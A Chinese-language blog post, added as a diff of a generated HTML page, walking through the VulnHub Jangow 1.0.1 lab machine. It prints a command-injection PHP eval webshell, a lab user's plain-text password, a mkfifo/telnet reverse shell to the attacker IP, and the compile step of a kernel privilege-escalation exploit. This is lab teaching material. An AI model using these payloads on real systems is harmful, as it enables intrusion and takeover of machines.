@@ -1,0 +1,809 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.ico">
+  <link rel="icon" href="/img/avatar.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pacemrc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境信息靶机地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;jangow-101,754&#x2F; kali攻击机：192.168.56.101 靶机：192.168.56.118 渗透测试主机发现netdiscover -r 192.168.56.0&#x2F;24    发现主机192.168.56.118 服务发现nmap -A 192.168.56.118    发现主机开放21和80端口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jangow-101754">
+<meta property="og:url" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/jangow-101754/index.html">
+<meta property="og:site_name" content="白日梦想家">
+<meta property="og:description" content="环境信息靶机地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;jangow-101,754&#x2F; kali攻击机：192.168.56.101 靶机：192.168.56.118 渗透测试主机发现netdiscover -r 192.168.56.0&#x2F;24    发现主机192.168.56.118 服务发现nmap -A 192.168.56.118    发现主机开放21和80端口">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160343048.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160520581.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160721210.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160836410.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160938368.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161033262.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161215436.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161913356.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161940811.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162024678.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162121022.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162450363.png">
+<meta property="og:image" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/jangow-101754/[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162621710.png)">
+<meta property="og:image" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/jangow-101754/[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162633911.png)">
+<meta property="og:image" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/jangow-101754/[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605163110560.png)">
+<meta property="og:image" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/jangow-101754/[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605163146437.png)">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605170641358.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605171321506.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605165216088.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605165201996.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605165731880.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605171833530.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605171902332.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172028639.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172144330.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172353444.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172515639.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172725145.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172910880.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605173043054.png">
+<meta property="article:published_time" content="2025-11-05T09:17:10.000Z">
+<meta property="article:modified_time" content="2025-11-26T11:02:09.747Z">
+<meta property="article:author" content="pacemrc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160343048.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>jangow-101754 - 白日梦想家</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pacemrc.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白日梦想家</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/category.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="jangow-101754"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        pacemrc
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-05 17:17" pubdate>
+          2025年11月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          904 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-10 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">jangow-101754</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h1><p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jangow-101,754/">https://www.vulnhub.com/entry/jangow-101,754/</a></p>
+<p>kali攻击机：192.168.56.101</p>
+<p>靶机：192.168.56.118</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">netdiscover</span> -r <span class="hljs-number">192.168.56.0</span>/<span class="hljs-number">24</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160343048.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现主机192.168.56.118</p>
+<h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><div class="code-wrapper"><pre><code class="hljs dns">nmap -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.56.118</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160520581.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>发现主机开放21和80端口</p>
+<h2 id="服务验证"><a href="#服务验证" class="headerlink" title="服务验证"></a>服务验证</h2><h3 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h3><p>21端口为ftp服务，尝试使用匿名用户登陆</p>
+<div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">192.168.56.118</span>
+用户名：anonymous
+密码空
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160721210.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>无法使用匿名用户登陆</p>
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.56.118/">http://192.168.56.118</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160836410.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>发现为目录索引页面，点击进入site目录</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605160938368.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>对该页面进行网页源代码查看，未发现有效信息。</p>
+<p>点击右上角的Buscar功能，跳转到另外一个页面</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161033262.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>该页面有一个buscar参数，需要传入值，尝试输入whoami值提交</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161215436.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>发现会显出命令执行的内容，该处存在命令执行漏洞</p>
+<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p>该处存在命令执行漏洞，象到两种方式：一、下载远程webshell文件。 二、执行反弹shell命令。尝试了该两种方式发现均不行，服务器不能与外网通信，想到服务器可能设置了防火墙策略。于是转为写入一句话木马</p>
+<div class="code-wrapper"><pre><code class="hljs mel">url编码前：（需要将$符号转义）
+echo <span class="hljs-string">&quot;&lt;?php @eval(\\$_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span> &gt;&gt;shell.php
+url编码后：
+echo+%22%3C%3Fphp+%40eval(%5C%24_POST%5B<span class="hljs-string">&#x27;shell&#x27;</span>%5D)%3B+%3F%3E%22+%3E%3Eshell.php
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161913356.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>执行ls命令，发现成功写入webshell</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605161940811.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>使用蚁剑连接</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162024678.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>成功连接上webshell</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162121022.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>查看系统上存在哪些普通用户</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd |grep 100
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162450363.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>发现存在jangow01用户</p>
+<p>接着对网站目录进行查看，分析存在的敏感文件</p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;site&#x2F;wordpress&#x2F;config.php存在用户名信息，但是系统上无该desafio02用户</p>
+<img src="[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162621710.png)" srcset="/img/loading.gif" lazyload alt="image-20230605162621710" style="zoom:50%;" />
+
+<img src="[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605162633911.png)" srcset="/img/loading.gif" lazyload alt="image-20230605162633911" style="zoom:50%;" />
+
+<p>继续查找，在&#x2F;var&#x2F;www&#x2F;html目录下发现存在.backup文件，查看该文件，为jangow01用户密码信息</p>
+<img src="[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605163110560.png)" srcset="/img/loading.gif" lazyload alt="image-20230605163110560" style="zoom:50%;" />
+
+<img src="[https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-](https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605163146437.png)" srcset="/img/loading.gif" lazyload alt="image-20230605163146437" style="zoom:50%;" />
+
+<p>尝试使用该用户密码信息登陆ftp</p>
+<div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">192.168.56.118</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605170641358.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>成功登陆ftp，下一步尝试登陆到jangow01用户，由于执行su命令需要在终端上执行，下一步进行反弹shell获取终端</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605171321506.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>由于靶机服务器上大概率开启了防火墙端口过滤，暂不知道什么端口可以出网，使用以下方式探寻靶机什么端口可以出网</p>
+<p>kali攻击机开启wireshark监听192.168.56.101IP对应的网卡，过滤IP地址来自于192.168.56.118地址的流量</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605165216088.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -zvn -w1 <span class="hljs-number">192.168.56.101</span> <span class="hljs-number">1</span>-<span class="hljs-number">500</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605165201996.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>发现kali机接收到靶机服务器的443端口的外发请求，</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605165731880.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>在kali机上开启443端口监听</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">443</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605171833530.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>靶机上执行以下命令</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf /tmp/f; <span class="hljs-built_in">mkfifo</span> /tmp/f &amp;&amp; telnet 192.168.56.101 443 0&lt;/tmp/f | /bin/sh 1&gt;/tmp/f
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605171902332.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>成功反弹shell，切换到交互式shell</p>
+<div class="code-wrapper"><pre><code class="hljs llvm">python<span class="hljs-number">3</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172028639.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>获取到第一个flag</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172144330.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看靶机系统内核</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r
+<span class="hljs-built_in">cat</span> /etc/os-release
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172353444.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>使用kali查看可利用漏洞</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> ubuntu <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172515639.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -m linux/local/<span class="hljs-number">45010</span>.c
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172725145.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>使用ftp将45010.c上传到靶机上</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ftp</span> <span class="hljs-number">192.168.56.118</span>
+<span class="hljs-attribute">jangow01</span>
+<span class="hljs-attribute">abygurl69</span>
+
+<span class="hljs-attribute">cd</span> /tmp
+<span class="hljs-attribute">put</span> <span class="hljs-number">45010</span>.c
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605172910880.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>编译exp</p>
+<div class="code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-string">gcc</span> <span class="hljs-string">45010</span>.<span class="hljs-string">c</span> -<span class="hljs-string">o</span> <span class="hljs-built_in">get-root</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230605173043054.png" srcset="/img/loading.gif" lazyload alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-"></p>
+<p>成功获取root权限</p>
+<h1 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h1><p>1、靶机的出端口被防火墙过滤，可通过<strong>nc端口扫描</strong>来发现哪些端口没有被过过滤</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -zvn -w1 <span class="hljs-number">192.168.56.101</span> <span class="hljs-number">1</span>-<span class="hljs-number">500</span>
+</code></pre></div>
+
+<p>2、webshell的shell不是来自终端，无法执行一些命令，如su等，可通过反弹shell来获取来自终端的shell</p>
+<p>3、写一句话木马，其中的特殊字符需要进行转义</p>
+<p>4、查看当前用户使用的shell</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-variable">$0</span>
+<span class="hljs-built_in">cat</span> /etc/passwd |grep 用户名
+</code></pre></div>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://devloop.users.sourceforge.net/index.php?article243/vulnhub-jangow-ctf-walkthrough">https://devloop.users.sourceforge.net/index.php?article243/vulnhub-jangow-ctf-walkthrough</a></p>
+<p>ftp可绕防火墙</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/" class="category-chain-item">靶场实验</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/empire-lupinone750/" title="empire-lupinone750">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">empire-lupinone750</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/vikings-1741/" title="vikings-1741">
+                        <span class="hidden-mobile">vikings-1741</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
